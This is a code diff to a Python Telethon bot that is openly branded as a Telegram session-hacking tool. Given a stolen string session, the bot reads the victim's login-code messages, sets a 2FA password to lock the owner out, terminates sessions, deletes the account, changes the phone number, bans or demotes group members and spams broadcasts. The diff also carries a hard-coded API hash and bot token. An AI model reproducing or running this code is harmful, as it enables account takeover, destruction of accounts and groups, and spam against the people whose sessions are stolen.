@@ -8,10 +8,14 @@ import os
 from telethon import TelegramClient, events, functions, types, Button
 from datetime import timedelta
 import asyncio
+
+API_ID = ("21627756")
 import os, asyncio, re
 from os import system
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
-client = TelegramClient('SourceZe', 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1").start(bot_token="6307474358:AAEin460r-2FvQttBO-hceYvDglAVVef4x0")
+API_HASH = ("fe77fbf0cae9f7f5ece37659e2466cf1")
+token = os.environ.get("6307474358:AAEin460r-2FvQttBO-hceYvDglAVVef4x0")
+client = TelegramClient('ArabicHack', 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1").start(bot_token=token)
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
 from telethon.sessions import StringSession as ses
@@ -20,10 +24,10 @@ import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
 
 from telethon.tl.functions.channels import CreateChannelRequest as ccr
-mybot = ("ZE6CBOT")
+mybot = os.environ.get("USERBOT")
 bot = borg = client
 
-SourceZe = '6509622797'
+ArabicHack = 6673736816
 
 api_id = ("21627756")
 api_hash = ("fe77fbf0cae9f7f5ece37659e2466cf1")
@@ -42,11 +46,11 @@ async def change_number_code(strses, number, code, otp):
     except BaseException:
       pass
     try:
-      await bot(leave("@UI_OS"))
+      await bot(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-		      await bot(leave("@UI_OS"))
+		      await bot(leave("@II_5_I"))
     except BaseException:
       pass
     try: 
@@ -63,19 +67,19 @@ async def change_number(strses, number):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     bot = client = X
     try:
-      await bot(join("@UI_XB "))
+      await bot(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await bot(join("@UI_XB "))
+      await bot(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await bot(leave("@UI_OS"))
+      await bot(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await bot(leave("@UI_OS"))
+      await bot(leave("@II_5_I"))
     except BaseException:
       pass
     result = await bot(functions.account.SendChangePhoneCodeRequest(
@@ -93,19 +97,19 @@ async def userinfo(strses):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     k = await X.get_me()
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@II_5_I"))
     except BaseException:
       pass
     return str(k)
@@ -113,19 +117,19 @@ async def userinfo(strses):
 async def terminate(strses):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@II_5_I"))
     except BaseException:
       pass
     await X(rt())
@@ -134,15 +138,15 @@ GROUP_LIST = []
 async def delacc(strses):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     try:
-      await X(join("@UI_OS"))
+      await X(join("@II_5_I"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_XB "))
+      await X(leave("@UI_XB"))
     except BaseException:
       pass
     await X(functions.account.DeleteAccountRequest("I am chutia"))
@@ -150,19 +154,19 @@ async def delacc(strses):
 async def promote(strses, grp, user):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@II_5_I"))
     except BaseException:
       pass
     try:
@@ -173,23 +177,23 @@ async def promote(strses, grp, user):
 async def user2fa(strses):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@II_5_I"))
     except BaseException:
       pass
     try:
-      await X.edit_2fa('SourceZe IS BEST')
+      await X.edit_2fa('ArabicHack IS BEST')
       return True
     except:
       return False
@@ -197,19 +201,19 @@ async def user2fa(strses):
 async def demall(strses, grp):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@II_5_I"))
     except BaseException:
       pass
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
@@ -223,19 +227,19 @@ async def demall(strses, grp):
 async def joingroup(strses, username):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@II_5_I"))
     except BaseException:
       pass
     await X(join(username))
@@ -244,19 +248,19 @@ async def joingroup(strses, username):
 async def leavegroup(strses, username):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@II_5_I"))
     except BaseException:
       pass
     await X(leave(username))
@@ -264,19 +268,19 @@ async def leavegroup(strses, username):
 async def delgroup(strses, username):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@II_5_I"))
     except BaseException:
       pass
     await X(dc(username))
@@ -294,19 +298,19 @@ async def usermsgs(strses):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     i = ""
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@II_5_I"))
     except BaseException:
       pass
     async for x in X.iter_messages(777000, limit=3):
@@ -318,19 +322,19 @@ async def usermsgs(strses):
 async def userbans(strses, grp):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@II_5_I"))
     except BaseException:
       pass
     k = await X.get_participants(grp)
@@ -345,19 +349,19 @@ async def userbans(strses, grp):
 async def userchannels(strses):
   async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(join("@UI_XB "))
+      await X(join("@UI_XB"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@UI_4R"))
     except BaseException:
       pass
     try:
-      await X(leave("@UI_OS"))
+      await X(leave("@II_5_I"))
     except BaseException:
       pass
     k = await X(pc())
@@ -374,7 +378,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "UI_XB "
+channel = "UI_XB"
 menu = '''
 
 **"A" :~ [Check user own groups and channels]
@@ -411,7 +415,7 @@ BY SOMY TEAM
 I will add more features Later 😅**
 '''
 mm = '''
-**⚜NOTICE FIRST JOIN SUPPORT @UI_XB ⚜**
+**⚜NOTICE FIRST JOIN SUPPORT @UI_XB⚜**
 '''
 
 keyboard = [
@@ -444,16 +448,16 @@ keyboard = [
 async def op(event):
   global mm
   if not event.is_private:
-    SourceZe = [
+    ArabicHack = [
       [
         Button.url("Click Here", f"https://t.me/SESSIONHACKABOT?start=hack")
         ]
       ]         
-    await event.reply("Click Below To Use Me", buttons=SourceZe)
+    await event.reply("Click Below To Use Me", buttons=ArabicHack)
   else:
     legendbye = [
       [
-        Button.url("Must Join", f"https://t.me/UI_XB ")
+        Button.url("Must Join", f"https://t.me/UI_XB")
         ]
       ]
     await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=legendbye)
@@ -461,12 +465,12 @@ async def op(event):
        
 @client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
 async def op(event):
-  SourceZe = [
+  ArabicHack = [
     [
       Button.url("Click Here", f"https://t.me/")
       ]
     ]         
-  await event.reply("Click Below To Use Me", buttons=SourceZe)
+  await event.reply("Click Below To Use Me", buttons=ArabicHack)
   
 @client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
 async def start(event):
@@ -520,7 +524,7 @@ async def users(event):
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nThanks For using SourceZeBot. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nThanks For using ArabicHackBot. \n/hack", buttons=keyboard)
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -533,7 +537,7 @@ async def users(event):
     else:
       return await event.respond("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nThanks For using SourceZe Bot.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nThanks For using ArabicHack Bot.\n/hack", buttons=keyboard)
     
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -548,7 +552,7 @@ async def users(event):
     await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
     grpid = await x.get_response()
     await userbans(strses.text, grpid.text)
-    await event.reply("Banning all members. Thanks For using SourceZe Bot", buttons=keyboard)
+    await event.reply("Banning all members. Thanks For using ArabicHack Bot", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
 async def users(event):
@@ -561,7 +565,7 @@ async def users(event):
       else:
         return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using SourceZe Bot", buttons=keyboard)
+      await event.reply(i + "\n\nThanks For using ArabicHack Bot", buttons=keyboard)
     
       
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -577,7 +581,7 @@ async def users(event):
     await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
     grpid = await x.get_response()
     await joingroup(strses.text, grpid.text)
-    await event.reply("Joined the Channel/Group Thanks For using SourceZe Bot", buttons=keyboard)
+    await event.reply("Joined the Channel/Group Thanks For using ArabicHack Bot", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
 async def users(event):
@@ -606,7 +610,7 @@ async def users(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using SourceZeBot.", buttons=keyboard)
+      await event.reply("Deleted the Channel/Group Thanks For using ArabicHackBot.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -620,7 +624,7 @@ async def users(event):
         return await event.respond("This StringSession is terminated maybe.", buttons=keyboard)
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `SourceZe Bot Is best` you can login now\n\nThanks For using SourceZe Bot.", buttons=keyboard)
+        await event.reply("User don't have two step thats why now two step is `ArabicHack Bot Is best` you can login now\n\nThanks For using ArabicHack Bot.", buttons=keyboard)
       else:
         await event.reply("Sorry User Have two step already", buttons=keyboard)
 
@@ -635,7 +639,7 @@ async def users(event):
       else:
         return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using SourceZeBot.", buttons=keyboard)
+      await event.reply("The all sessions are terminated\n\nThanks For using ArabicHackBot.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
@@ -648,7 +652,7 @@ async def users(event):
       else:
         return await event.respond("This StringSession Has Been Terminated.", buttons=keyboard)
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using SourceZe Bot.", buttons=keyboard)
+      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using ArabicHack Bot.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
 async def users(event):
@@ -665,7 +669,7 @@ async def users(event):
       await x.send_message("NOW GIVE USER USERNAME")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using SourceZe Bot.", buttons=keyboard)
+      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
 async def users(event):
@@ -683,7 +687,7 @@ async def users(event):
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using SourceZeBot.", buttons=keyboard)
+      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using ArabicHackBot.", buttons=keyboard)
 
 @client.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
 async def users(event):
@@ -711,7 +715,7 @@ async def users(event):
         else:
           await event.respond("Something is wrong")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO - @UI_XB \n**LOGS**\n" + str(e))
+        await event.respond("SEND THIS ERROR TO - @UI_XB\n**LOGS**\n" + str(e))
 
 
 
@@ -783,7 +787,7 @@ async def users(event):
       msg = await x.get_response()
       await x.send_message("Now Done It Will Send message automatically every 10 min")
       i = await gcasta(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} all 😗😗\n\nThanks For Using SourceZe Bot.", buttons=keyboard)
+      await event.reply(f"Done Gcasted In {i} all 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
 
 molb = True
 
@@ -907,7 +911,7 @@ async def users(event):
       msg = await x.get_response()
       await x.send_message("Now Done It Will Send message automatically every 10 min")
       i = await gcastb(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} Group 😗😗\n\nThanks For Using SourceZe Bot.", buttons=keyboard)
+      await event.reply(f"Done Gcasted In {i} Group 😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
 
 async def gcastc(strses, msg):
     async with tg(ses(strses), 21627756, "fe77fbf0cae9f7f5ece37659e2466cf1") as X:
@@ -942,7 +946,7 @@ async def users(event):
       msg = await x.get_response()
       await x.send_message("Now Done It Will Send message automatically every 10 min")
       i = await gcastc(strses.text, msg.text)
-      await event.reply(f"Done Gcasted In {i} Private😗😗\n\nThanks For Using SourceZe Bot.", buttons=keyboard)
+      await event.reply(f"Done Gcasted In {i} Private😗😗\n\nThanks For Using ArabicHack Bot.", buttons=keyboard)
 
-print("⚜️ Bot Deploy Successfully ⚜️ Kindly Join @UI_XB |SourceZe")
+print("⚜️ Bot Deploy Successfully ⚜️ Kindly Join @UI_XB|UI_OS")
 client.run_until_disconnected()
